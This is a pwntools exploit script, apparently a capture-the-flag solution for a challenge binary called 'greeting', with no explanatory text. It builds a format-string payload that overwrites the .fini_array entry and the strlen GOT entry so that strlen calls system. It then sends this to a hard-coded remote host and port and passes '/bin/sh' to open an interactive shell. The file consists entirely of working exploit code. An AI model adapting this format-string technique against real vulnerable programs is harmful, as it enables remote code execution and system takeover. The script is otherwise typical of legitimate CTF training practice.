#coding:utf-8
#wp url:https://blog.csdn.net/qq_42728977/article/details/102880186
from pwn import *

debug = 0
context.log_level = 'debug'

def exp(debug):
	lib = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	elf = ELF('./greeting')
	if debug == 1:
		r = process('./greeting')
	else:
		r = remote('159.138.137.79', 64586)
		
	r.recvuntil('Please tell me your name... ')
	fini_array = 0x08049934
	restart = 0x080484F0
	strlen_got = elf.got['strlen']
	system = 0x08048490

	payload = ('aa' + p32(fini_array + 2) + p32(strlen_got + 2) + p32(strlen_got) + p32(fini_array) + '%%%dc%%%d$hn'%(0x0804 - 20 - 0x10, int((0x1c + 20) / 0x4)) + '%%%d$hn'%(int((0x20 + 20) / 0x4)) + '%%%dc%%%d$hn'%(0x8490 - 0x0804, int((0x24 + 20) / 0x4)) + '%%%dc%%%d$hn'%(0x84f0 - 0x8490, int((0x28 + 20) / 0x4)) + '\n')
	print(payload)	
#r.send(('aa' + p32(fini_array + 2) + p32(strlen_got) + p32(fini_array) + '%%%dc%%%d$hn'%(0x0804 - 20 - 0xc, int((0x1c + 20) / 0x4)) + '%%%dc%%%d$hn'%(0x8490 - 0x0804, int((0x20 + 20) / 0x4)) + '%%%dc%%%d$hn'%(0x84f0 - 0x8490, int((0x24 + 20) / 0x4))).ljust(0x40, '\x00'))
	r.send(payload)

	r.recvuntil('Please tell me your name... ')
	r.send('/bin/sh\n')
	r.interactive()
exp(debug)
